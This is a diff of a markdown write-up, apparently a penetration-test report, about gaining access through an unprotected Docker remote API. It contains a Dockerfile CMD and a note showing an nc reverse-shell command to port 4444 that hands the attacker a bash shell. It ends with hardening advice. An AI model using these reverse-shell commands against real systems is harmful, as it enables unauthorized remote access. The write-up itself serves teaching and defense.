@@ -25,7 +25,7 @@ Think of Docker as the app-based virtualization technology where you get faster 
 | **Isolation**         		| A layer over the host OS 	|			Isolated		|
 
 <br>
-You can find more details in [Wikipedia](https://en.wikipedia.org/wiki/Docker_(software)).
+You can find more details in this [Wikipedia page](https://en.wikipedia.org/wiki/Docker_(software)).
 
 In order to create a Docker container, you need to build an image first. You can find images at [Docker Hub](https://hub.docker.com/) or you can build your own using a [_Dockerfile_](https://docs.docker.com/engine/reference/builder/). After building your image, it gets saved locally on the disk, then you can create a container based on this image and start it.
 
@@ -80,7 +80,7 @@ CMD ["nc", "-n", "My_OWN_IP", "4444", "-e", "/bin/bash"]
 ```
 
 Note
-> CMD is the command that is to executed upon the startup of the container. In our case, it's just like running `nc -n xx.xx.xx.xx 444 -e /bin/bash` in the container system.
+> CMD is the command that is to executed upon the startup of the container. In our case, it's just like running `nc -n 192.168.1.50 4444 -e /bin/bash` in the container system, which is going to connect to the IP `192.168.1.50` on port `4444` and redirect all the input into the bash shell.
 
 
 Afterwards, we start to craft the POST request and the JSON object needed in order to build our image.
@@ -99,7 +99,7 @@ Content-Length: 2
 {}
 ```
 
-The reponse came confirming the creation of the image successfully
+The reponse came confirming the creation of the image successfully.
 ```http
 HTTP/1.1 201 Created
 Server: nginx/1.10.3 (Ubuntu)
@@ -216,11 +216,11 @@ I'm going to list the mistakes and misconfugiration problems which led to this a
 
 - **Unprotected API**
 
-	Being one of the suggested OWASP's top 10 most critical web application security risks for 2017, I can't stress enough how important it is for developers to follow standard security procedures and policies. The API could've been hardened further by doing two things:
+	Being one of the suggested OWASP's top 10 most critical web application security risks for 2017, I can't stress enough how important it is for developers to follow standard security procedures and policies when it comes to APIs. The API could've been hardened further by doing two things:
 
 	1. Restrict access to the API by only allowing specific computers/IP address to use it. You can use [iptables](https://www.garron.me/en/bits/iptables-open-port-for-specific-ip.html) or [firewalld](https://major.io/2014/11/24/trust-ip-address-firewallds-rich-rules/).
 
-	2. Implement proper authorization to the API, to prevent unauthenticated attempts to abuse the API and create Docker images/containers. Refer to this [article](http://tech.paulcz.net/2016/01/secure-docker-with-tls/) for further details.
+	2. Implement proper authorization to the API using TLS certiciates, to prevent unauthenticated attempts to abuse the API and create Docker images/containers. Refer to this [article](http://tech.paulcz.net/2016/01/secure-docker-with-tls/) for further details.
  
 - **SSH Root Login**
 
@@ -228,7 +228,7 @@ I'm going to list the mistakes and misconfugiration problems which led to this a
 
 - **Insufficient OS Protection**
 
-	Furthermore, the System Administrator should integrate Kernel hardening modules such as [SELinux](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux_atomic_host/7/html/container_security_guide/docker_selinux_security_policy) or [AppArmor](https://docs.docker.com/engine/security/apparmor/). This could've helped in preventing me from accessing the file system on the host _**even if I had read/write permissions on all directories and files**_.
+	Furthermore, the System Administrator should integrate Kernel hardening modules such as [SELinux](https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux_atomic_host/7/html/container_security_guide/docker_selinux_security_policy) or [AppArmor](https://docs.docker.com/engine/security/apparmor/). This could've helped in preventing from accessing the file system on the host _**even if the user had read/write permissions on all directories and files**_.
 
 
 
